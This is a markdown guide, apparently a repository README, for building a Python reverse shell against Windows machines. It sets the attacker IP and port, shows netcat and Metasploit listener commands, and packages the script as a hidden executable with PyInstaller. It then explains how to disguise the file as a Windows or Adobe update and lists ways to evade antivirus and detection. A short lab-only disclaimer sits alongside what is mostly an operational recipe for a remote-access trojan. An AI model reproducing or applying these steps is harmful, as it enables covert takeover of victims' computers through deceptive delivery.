# Windows Reverse Shell Setup Guide

## Overview
This directory contains Python scripts for creating reverse shell connections from Windows machines to your Kali Linux attacker machine. The script is designed to be converted to an executable (.exe) for realistic penetration testing scenarios.

## Files in this directory:
- `reverse_shell.py` - Main reverse shell script
- `disguised_app.py` - Script disguised as a legitimate application
- `setup_instructions.md` - This file
- `convert_to_exe.md` - Instructions for converting Python to executable

## Quick Setup

### Step 1: Configure the Python Script
Edit `reverse_shell.py` and change these variables:
```python
ATTACKER_IP = "192.168.1.10"  # Your Kali Linux IP
ATTACKER_PORT = 4444          # Port for the connection
```

### Step 2: Set up Listener on Kali
```bash
# Simple netcat listener
sudo nc -nlvp 4444

# OR use Metasploit for advanced features
msfconsole
use exploit/multi/handler
set PAYLOAD python/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

### Step 3: Test the Connection
```bash
# On your Windows VM, run:
python reverse_shell.py
```

## Converting to Executable

### Option 1: Using PyInstaller (Recommended)
```bash
# Install PyInstaller on Windows or use wine on Kali
pip install pyinstaller

# Create standalone executable
pyinstaller --onefile --noconsole reverse_shell.py

# Output will be in dist/reverse_shell.exe
```

### Option 2: Using Auto-py-to-exe (GUI)
```bash
pip install auto-py-to-exe
auto-py-to-exe
```

### Option 3: Cross-compile from Kali
```bash
# Install wine and Python for Windows
sudo apt install wine python3-pip

# Use PyInstaller with wine
wine pip install pyinstaller
wine pyinstaller --onefile --noconsole reverse_shell.py
```

## Social Engineering Scenarios

### Disguise Techniques:
1. **Rename the executable** to something legitimate:
   - `Windows_Update.exe`
   - `Adobe_Flash_Player.exe`
   - `System_Cleaner.exe`
   - `WiFi_Password_Recovery.exe`

2. **Change the icon** using tools like:
   - Resource Hacker
   - IconChanger
   - PyInstaller's `--icon` option

3. **Add file properties** to make it look legitimate:
   - Company name
   - Version information
   - Description

## Detection Evasion

### Basic Techniques:
- Use uncommon ports (not 4444, 1234, etc.)
- Add delays between connection attempts
- Encrypt communications
- Use domain names instead of IP addresses

### Advanced Techniques:
- Process migration
- DLL injection
- Persistence mechanisms
- Anti-VM detection

## Important Reminders

⚠️ **ONLY use in controlled lab environments**
⚠️ **NEVER deploy on systems you don't own**
⚠️ **This is for educational purposes only**

## Troubleshooting

### Common Issues:
1. **Connection refused**: Check if listener is running
2. **Firewall blocking**: Configure Windows/Kali firewalls
3. **Antivirus detection**: Use obfuscation techniques
4. **Network issues**: Verify IP addresses and network connectivity

### Testing Checklist:
- [ ] Kali and Windows VMs can ping each other
- [ ] Firewall rules allow the connection
- [ ] Correct IP addresses in the script
- [ ] Listener is running before executing payload
- [ ] No antivirus blocking the connection